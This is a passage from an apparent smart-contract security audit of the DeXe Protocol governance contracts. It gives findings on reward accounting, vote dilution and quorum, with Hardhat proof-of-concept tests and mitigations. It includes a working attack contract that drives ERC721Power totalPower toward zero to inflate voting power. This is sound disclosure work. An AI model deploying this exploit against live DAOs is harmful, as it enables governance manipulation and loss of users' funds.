      let GOV_POOL_SETTINGS = JSON.parse(JSON.stringify(POOL_PARAMETERS.settingsParams.proposalSettings[1]));
      GOV_POOL_SETTINGS.validatorsVote = validatorsVote;
      GOV_POOL_SETTINGS.duration = duration;

      await executeValidatorProposal(
        [
          [settings.address, 0, getBytesAddSettings([GOV_POOL_SETTINGS])],
          [settings.address, 0, getBytesChangeExecutors([govPool.address, settings.address], [4, 4])],
        ],
        []
      );
    }
```

Then put PoC in `GovPool.test.js` under section `describe("getProposalState()", () => {`:
```javascript
      it("audit micropool rewards short-change delegator for long proposals with multiple delegations", async () => {
        // so proposals will be active in voting state for longer
        const WEEK = (30 * 24 * 60 * 60) / 4;
        const TWO_WEEKS = WEEK * 2;
        const MONTH = TWO_WEEKS * 2;
        const TWO_MONTHS = MONTH * 2;

        // so proposal doesn't need to go to validators
        await changeInternalSettings2(false, TWO_MONTHS);

        // required for executing the first 2 proposals
        await govPool.deposit(govPool.address, wei("200"), []);

        // create 4 proposals; only the first 2 will be executed
        // create proposal 1
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], false)]]
        );
        // create proposal 2
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 3
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 4
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );

        let proposal1Id = 2;
        let proposal2Id = 3;
        let DELEGATEE = await accounts(10);
        let DELEGATOR1 = await accounts(9);

        let delegator1Tokens = wei("200000000000000000000");
        let delegator1Half = wei("100000000000000000000");

        let delegateeReward = wei("40000000000000000000");
        let delegator1Reward = wei("160000000000000000000");

        // mint tokens & deposit them to have voting power
        await token.mint(DELEGATOR1, delegator1Tokens);
        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });
        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });

        // delegator1 delegates its total voting power to AUDITOR
        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });

        // DELEGATEE votes on the first proposal
        await govPool.vote(proposal1Id, true, "0", [], { from: DELEGATEE });

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // execute proposal 1
        await govPool.execute(proposal1Id);

        // verify pending rewards via GovPool::getPendingRewards()
        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        // delegator1 receives full reward for all tokens they delegated
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        // reward balances 0 before claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), "0");

        // claim rewards
        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });

        // verify reward balances after claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);

        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);

        // delegator1 undelegates half of its total voting power from DELEGATEE,
        // such that DELEGATEE only has half the voting power for second proposal
        await govPool.undelegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });

        // DELEGATEE votes on the second proposal for the first time using the first
        // half of DELEGATOR1's voting power. This isn't enough to decide the proposal
        await govPool.vote(proposal2Id, true, "0", [], { from: DELEGATEE });

        // time advances 1 month, proposal is a longer proposal so still in voting state
        await setTime((await getCurrentBlockTime()) + MONTH);

        // delegator1 delegates remaining half of its voting power to DELEGATEE
        // this cancels the previous vote and re-votes with the full voting power
        // which will be enough to decide the proposal
        await govPool.delegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);

        // execute proposal 2
        await govPool.execute(proposal2Id);

        // verify pending rewards via GovPool::getPendingRewards()
        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        // delegatee getting paid the full rewards for the total voting power
        // delegator1 delegated
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);

        // fails as delegator1 only paid half the rewards - not being paid for the
        // full amount it delegated!
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);
      });
```

Run with: `npx hardhat test --grep "rewards short-change delegator for long proposals"`

**Recommended Mitigation:** Change how `GovMicroPool` [retrieves the expected rewards](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157) from the list of delegated amounts such that the entire delegated amount will be retrieved when the same delegator delegates to the same delegatee multiple times over separate blocks.

**Dexe:**
Fixed in [PR170](https://github.com/dexe-network/DeXe-Protocol/commit/02e0dde26343c98c7bb7211d7d42989daa6b742e).

**Cyfrin:** Verified.


### Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0

**Description:** Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0 using a permission-less attack contract by taking advantage of being able to call `ERC721Power::recalculateNftPower()` & `getNftPower()` for non-existent nfts:

```solidity
function getNftPower(uint256 tokenId) public view override returns (uint256) {
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
    }

    // @audit 0 for non-existent tokenId
    uint256 collateral = nftInfos[tokenId].currentCollateral;

    // Calculate the minimum possible power based on the collateral of the nft
    // @audit returns default maxPower for non-existent tokenId
    uint256 maxNftPower = getMaxPowerForNft(tokenId);
    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));
    minNftPower = maxNftPower.min(minNftPower);

    // Get last update and current power. Or set them to default if it is first iteration
    // @audit both 0 for non-existent tokenId
    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;
    uint256 currentPower = nftInfos[tokenId].currentPower;

    if (lastUpdate == 0) {
        lastUpdate = powerCalcStartTimestamp;
        // @audit currentPower set to maxNftPower which
        // is just the default maxPower even for non-existent tokenId!
        currentPower = maxNftPower;
    }

    // Calculate reduction amount
    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);
    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));
    uint256 newPotentialPower = currentPower - powerReduction;

    // @audit returns newPotentialPower slightly reduced
    // from maxPower for non-existent tokenId
    if (minNftPower <= newPotentialPower) {
        return newPotentialPower;
    }

    if (minNftPower <= currentPower) {
        return minNftPower;
    }

    return currentPower;
}

function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }

    // @audit newPower > 0 for non-existent tokenId
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit as this is the first update since
    // tokenId doesn't exist, totalPower will be
    // subtracted by nft's max power
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit then totalPower is increased by newPower where:
    // 0 < newPower < maxPower hence net decrease to totalPower
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    nftInfo.currentPower = newPower;
}
```

**Impact:** `ERC721Power::totalPower` lowered to near 0. This can be used to artificially increase voting power since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and is used as [the divisor in `GovUserKeeper::getNftsPowerInTokensBySnapshot()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559).

This attack is pretty devastating as `ERC721Power::totalPower` can never be increased since the `currentPower` of individual nfts can only ever be decreased; there is no way to "undo" this attack unless the nft contract is replaced with a new contract.

**Proof of Concept:** Add attack contract `mock/utils/ERC721PowerAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // this attack can decrease ERC721Power::totalPower close to 0
    //
    // this attack works when block.timestamp > nftPower.powerCalcStartTimestamp
    // by taking advantage calling recalculateNftPower for non-existent nfts
    function attack2(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId,
        uint256 attackIterations
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // verify attack starts on the correct block
        require(
            block.timestamp > nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack2 requires block.timestamp > nftPower.powerCalcStartTimestamp"
        );

        // verify totalPower() correct at starting block
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // output totalPower before attack
        console.log(nftPower.totalPower());

        // keep calling recalculateNftPower() for non-existent nfts
        // this lowers ERC721Power::totalPower() every time
        // can't get it to 0 due to underflow but can get close enough
        for (uint256 i; i < attackIterations; ) {
            nftPower.recalculateNftPower(++lastTokenId);
            unchecked {
                ++i;
            }
        }

        // output totalPower after attack
        console.log(nftPower.totalPower());

        // original totalPower : 10000000000000000000000000000
        // current  totalPower : 900000000000000000000000000
        require(
            nftPower.totalPower() == 900000000000000000000000000,
            "ERC721PowerAttack: after attack finished totalPower should equal 900000000000000000000000000"
        );
    }
}
```

Add test harness to `ERC721Power.test.js`:
```javascript
    describe("audit attacker can manipulate ERC721Power totalPower", () => {
      it("audit attack 2 dramatically lowers ERC721Power totalPower", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to just after the start of power calculation
        await setTime(powerCalcStartTime);

        // launch the attack
        await attackContract.attack2(nft.address, maxPowerPerNft.times(10).toFixed(), 10, 91);
      });
    });
```

Run attack with: `npx hardhat test --grep "audit attack 2 dramatically lowers ERC721Power totalPower"`

**Recommended Mitigation:** `ERC721Power::recalculateNftPower()` should revert when called for non-existent nfts.

**Dexe:**
Fixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2).

**Cyfrin:** Verified.


### `DistributionProposal` 'for' voter rewards diluted by 'against' voters and missing rewards permanently stuck in `DistributionProposal` contract

**Description:** `DistributionProposal` [only pays rewards to users who voted "for" the proposal](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L115-L117), not "against" it.

But when [calculating the reward](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L119-L123) `DistributionProposal::getPotentialReward()` the divisor is `coreRawVotesFor + coreRawVotesAgainst` which represents the total sum of all votes both "for" and "against", even though votes "against" are excluded from rewards.

The effect of this is that rewards to "for" voters are diluted by "against" voters, even though "against" voters don't qualify for the rewards. The missing rewards are permanently stuck inside the `DistributionProposal` contract unable to ever be paid out.

Attempting to retrieve the rewards by creating a new `DistributionProposal` fails as the rewards are stuck inside the existing  `DistributionProposal` contract. Attempting to create a new 2nd "rescue" proposal `secondProposalId` using the existing `DistributionProposal` contract fails as:

1) `DistributionProposal::execute()` [requires](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L58) `amount > 0` and [transfers](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L65) that amount into the contract, so it would have to be re-funded again with `newRewardAmount`

2) `DistributionProposal::execute()` [sets](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67) `proposals[secondProposalId].rewardAmount = newRewardAmount`

3) `DistributionProposal::claim()` [has to be called](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L71) with `secondProposalId` which calls `DistributionProposal::getPotentialReward()` which [uses](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L120) this `newRewardAmount` for calculating the reward users will receive.

So it doesn't appear possible to rescue the unpaid amount from the first proposal using this strategy. There appears to be no mechanism to retrieve unpaid tokens from the `DistributionProposal` contract.

**Impact:** In every proposal that has both "for" and "against" voters, the `DistributionProposal` rewards paid out to "for" voters will be less than the total reward amount held by the `DistributionProposal` contract and the missing balance will be permanently stuck inside the `DistributionProposal` contract.

**Proof of Concept:** Add PoC to `DistributionProposal.test.js` under section `describe("claim()", () => {`:
```javascript
      it("audit for voter rewards diluted by against voter, remaining rewards permanently stuck in DistributionProposal contract", async () => {
        let rewardAmount = wei("10");
        let halfRewardAmount = wei("5");

        // mint reward tokens to sending address
        await token.mint(govPool.address, rewardAmount);

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [token.address, 0, getBytesApprove(dp.address, rewardAmount)],
            [dp.address, 0, getBytesDistributionProposal(1, token.address, rewardAmount)],
          ],
          [],
          { from: SECOND }
        );

        // only 1 vote "for" by SECOND who should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });
        // but THIRD votes "against", these votes are excluded from getting the reward
        await govPool.vote(1, false, 0, [6], { from: THIRD });

        // fully fund the proposal using erc20 token
        await impersonate(govPool.address);
        await token.approve(dp.address, rewardAmount, { from: govPool.address });
        await dp.execute(1, token.address, rewardAmount, { from: govPool.address });

        // verify SECOND has received no reward
        assert.equal((await token.balanceOf(SECOND)).toFixed(), "0");

        // claiming the reward releases the erc20 tokens
        await dp.claim(SECOND, [1]);

        // SECOND only receives half the total reward as the reward is diluted
        // by the "against" vote, even though that vote is excluded from the reward.
        // as a consequence only half of the reward is paid out to the "for" voter when
        // they should get 100% of the reward since they were the only "for" voter and
        // only "for" votes qualify for rewards
        assert.equal((await token.balanceOf(SECOND)).toFixed(), halfRewardAmount);

        // the remaining half of the reward is permanently stuck
        // inside the DistributionProposal contract!
        assert.equal((await token.balanceOf(dp.address)).toFixed(), halfRewardAmount);
      });
```

Run with: `npx hardhat test --grep "audit for voter rewards diluted by against voter"`

**Recommended Mitigation:** Consider one of the following options:

a) Change the [reward calculation divisor](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122) to use only `coreRawVotesFor`.

b) If the intentional design is to allow "against" voters to dilute the rewards of "for" voters, then implement a mechanism to refund the unpaid tokens from the `DistributionProposal` contract back to the `GovPool` contract. This could be done inside `DistributionProposal::execute()` using a process like:

1) calculating `againstDilutionAmount`,
2) setting `proposal.rewardAmount = amount - againstDilutionAmount`
3) refunding `againstDilutionAmount` back to `govPool`
4) change the [reward calculation divisor](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122) to use only `coreRawVotesFor`

Note: 2) gets slightly more complicated if the intention is to support fee-on-transfer tokens since the actual amount received by the contract would need to be calculated & used instead of the input amount.

**Dexe:**
Fixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/a143871ed0ac7184aca9e385363eb7d72eaef190).

**Cyfrin:** Verified.


### `GovPool::delegateTreasury` does not verify transfer of tokens and NFTs to delegatee leading to potential voting manipulation

**Description:** `GovPool::delegateTreasury` transfers ERC20 tokens & specific nfts from DAO treasury to `govUserKeeper`. Based on this transfer, the `tokenBalance` and `nftBalance` of the delegatee is increased. This allows a delegatee to use this delegated voting power to vote in critical proposals.

As the following snippet of `GovPool::delegateTreasury` function shows, there is no verification that the tokens and nfts are actually transferred to the `govUserKeeper`. It is implicitly assumed that a successful transfer is completed and subsequently, the voting power of the delegatee is increased.

```solidity
  function delegateTreasury(
        address delegatee,
        uint256 amount,
        uint256[] calldata nftIds
    ) external override onlyThis {
        require(amount > 0 || nftIds.length > 0, "Gov: empty delegation");
        require(getExpertStatus(delegatee), "Gov: delegatee is not an expert");

        _unlock(delegatee);

        if (amount != 0) {
            address token = _govUserKeeper.tokenAddress();

  >          IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals())); //@audit no check if tokens are actually transferred

            _govUserKeeper.delegateTokensTreasury(delegatee, amount);
        }

        if (nftIds.length != 0) {
            IERC721 nft = IERC721(_govUserKeeper.nftAddress());

            for (uint256 i; i < nftIds.length; i++) {
  >              nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]); //-n no check if nft's are actually transferred
            }

            _govUserKeeper.delegateNftsTreasury(delegatee, nftIds);
        }

        _revoteDelegated(delegatee, VoteType.TreasuryVote);

        emit DelegatedTreasury(delegatee, amount, nftIds, true);
    }
```

This could lead to a dangerous situation where a malicious DAO treasury can increase voting power manifold while actually transferring tokens only once (or even, not transfer at all). This breaks the invariance that the total accounting balances in `govUserKeeper` contract must match the actual token balances in that contract.


**Impact:** Since both the ERC20 and ERC721 token implementations are controlled by the DAO, and since we are dealing with upgradeable token contracts, there is a potential rug-pull vector created by the implicit transfer assumption above.


**Recommended Mitigation:** Since DEXE starts out with a trustless assumption that does not give any special trust privileges to a DAO treasury, it is always prudent to follow the "trust but verify" approach when it comes to non-standard tokens, both ERC20 and ERC721. To that extent, consider adding verification of token & nft balance increase before/after token transfer.


**Dexe:**
Acknowledged; this finding is about tokens we have no control over. These tokens have to be corrupt in order for `safeTransferFrom` and `transfer` functions to not work. With legit tokens everything works as intended.


### Static `GovUserKeeper::_nftInfo.totalPowerInTokens` used in quorum denominator can incorrectly make it impossible to reach quorum

**Description:** Consider the following factors:

1) `GovPoolVote::_quorumReached()` [uses](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L337) `GovUserKeeper::getTotalVoteWeight()` as the denominator for determining whether quorum has been reached.

2) `GovUserKeeper::getTotalVoteWeight()` returns the current total supply of ERC20 tokens [plus](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573) `_nftInfo.totalPowerInTokens`

3) `_nftInfo.totalPowerInTokens` which is [only set once at initialization](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690-L694) represents the total voting power of the nft contract in erc20 tokens.

When voting using `ERC721Power` nfts where nft power can decrease to zero if nfts don't have the required collateral deposited, this can result in a state where `ERC721Power.totalPower() == 0` but `GovUserKeeper::_nftInfo.totalPowerInTokens > 0`.

Hence the voting power of the ERC20 voting tokens will be incorrectly diluted by the nft's initial voting power `GovUserKeeper::_nftInfo.totalPowerInTokens`, even though the nfts have lost all voting power.

This can result in a state where quorum is impossible to reach.

**Impact:** Quorum can be impossible to reach.

**Proof of Concept:** Firstly comment out GovUserKeeper [L677](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L677) & [L690](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690) to allow quickly in-place changing of the voting & nft contracts.

Add PoC to `GovPool.test.js` under section `describe("getProposalState()", () => {`:
```javascript
      it("audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator can incorrectly make it impossible to reach quorum", async () => {
        // time when nft power calculation starts
        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

        // required so we can call .toFixed() on BN returned outputs
        ERC721Power.numberFormat = "BigNumber";

        // ERC721Power.totalPower should be zero as no nfts yet created
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // so proposal doesn't need to go to validators
        await changeInternalSettings(false);

        // set nftPower as the voting nft
        // need to comment out check preventing updating existing
        // nft address in GovUserKeeper::setERC721Address()
        await impersonate(govPool.address);
        await userKeeper.setERC721Address(nftPower.address, wei("190000000000000000000"), 1, { from: govPool.address });

        // create a new VOTER account and mint them the only power nft
        let VOTER = await accounts(10);
        await nftPower.safeMint(VOTER, 1);

        // switch to using a new ERC20 token for voting; lets us
        // control exactly who has what voting power without worrying about
        // what previous setups have done
        // requires commenting out require statement in GovUserKeeper::setERC20Address()
        let newVotingToken = await ERC20Mock.new("NEWV", "NEWV", 18);
        await impersonate(govPool.address);
        await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });

        // mint VOTER some tokens that when combined with their NFT are enough
        // to reach quorum
        let voterTokens = wei("190000000000000000000");
        await newVotingToken.mint(VOTER, voterTokens);
        await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });
        await nftPower.approve(userKeeper.address, "1", { from: VOTER });

        // VOTER deposits their tokens & nft to have voting power
        await govPool.deposit(VOTER, voterTokens, [1], { from: VOTER });

        // advance to the approximate time when nft power calculation starts
        await setTime(powerNftCalcStartTime);

        // verify nft power after power calculation has started
        let nftTotalPowerBefore = "900000000000000000000000000";
        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);

        // create a proposal which takes a snapshot of the current nft power
        let proposal1Id = 2;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // vote on first proposal
        await govPool.vote(proposal1Id, true, voterTokens, [1], { from: VOTER });

        // advance time to allow proposal state change
        await setTime((await getCurrentBlockTime()) + 10);

        // verify that proposal has reached quorum;
        // VOTER's tokens & nft was enough to reach quorum
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // advance time; since VOTER's nft doesn't have collateral deposited
        // its power will decrement to zero
        await setTime((await getCurrentBlockTime()) + 10000);

        // call ERC721::recalculateNftPower() for the nft, this will update
        // ERC721Power.totalPower with the actual current total power
        await nftPower.recalculateNftPower("1");

        // verify that the true totalPower has decremented to zero as the nft
        // lost all its power since it didn't have collateral deposited
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // create 2nd proposal which takes a snapshot of the current nft power
        let proposal2Id = 3;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // vote on second proposal
        await govPool.vote(proposal2Id, true, voterTokens, [1], { from: VOTER });

        // advance time to allow proposal state change
        await setTime((await getCurrentBlockTime()) + 10);

        // verify that proposal has not reached quorum;
        // even though VOTER owns 100% of the supply of the ERC20 voting token,
        // it is now impossible to reach quorum since the power of VOTER's
        // ERC20 tokens is being incorrectly diluted through the quorum calculation
        // denominator assuming the nfts still have voting power.
        //
        // this is incorrect as the nft has lost all power. The root cause
        // is GovUserKeeper::_nftInfo.totalPowerInTokens which is static
        // but used in the denominator when calculating whether
        // quorum is reached
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);
      });
```

Run with: `npx hardhat test --grep "audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator"`

**Recommended Mitigation:** Change `GovUserKeeper::getTotalVoteWeight` [L573](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573) to use 0 instead of `_nftInfo.totalPowerInTokens` if `IERC721Power(nftAddress).totalPower() == 0`.

Consider whether this should be refactored such that the suggested `totalPower() == 0` check should not be done against the current `totalPower`, but against the `totalPower` saved when the proposal's nft snapshot was created which is stored in `GovUserKeeper::nftSnapshot[proposalSnapshotId]`.

**Dexe:**
Fixed in [PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887) & commit [7a0876b](https://github.com/dexe-network/DeXe-Protocol/commit/7a0876b3c6f832d03b2d45760a85b42d23a21ce7).

**Cyrin:**
During the mitigations Dexe has performed significant refactoring on the power nfts; what was previously 1 contract has become 3, and the interaction between the power nft voting contracts and `GovPool` & `GovUserKeeper` has been significantly changed.

In the new implementation:
* when users use power nfts to [vote personally, this uses the current power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/libs/gov/gov-user-keeper/GovUserKeeperView.sol#L185) of the power nft
* when users delegate power nfts and [have the delegatee vote, this caches the minimum power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L266) of the power nft
* when the power nft [`totalRawPower` is calculated, this always uses the current power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/ERC721/powers/AbstractERC721Power.sol#L212) of power nfts
* the [quorum denominator always uses `totalRawPower`](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L619) which is calculated from the current power

The effect of this is that:
* users are highly penalized for delegating power nfts compared to using them to personally vote
* the quorum denominator is always based on the current nft power so will be over-inflated if users are delegating their nfts and receiving only the minimum voting power

Here is a PoC for `GovPool.test.js` that illustrates this scenario:
```javascript
       it("audit actual power nft voting power doesn't match total nft voting power", async () => {
          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

          // required so we can call .toFixed() on BN returned outputs
          ERC721RawPower.numberFormat = "BigNumber";

          // ERC721RawPower::totalPower should be zero as no nfts yet created
          assert.equal((await nftPower.totalPower()).toFixed(), "0");

          // set nftPower as the voting nft
          // need to comment out check preventing updating existing
          // nft address in GovUserKeeper::setERC721Address()
          await impersonate(govPool.address);
          await userKeeper.setERC721Address(nftPower.address, wei("33000"), 33, { from: govPool.address });

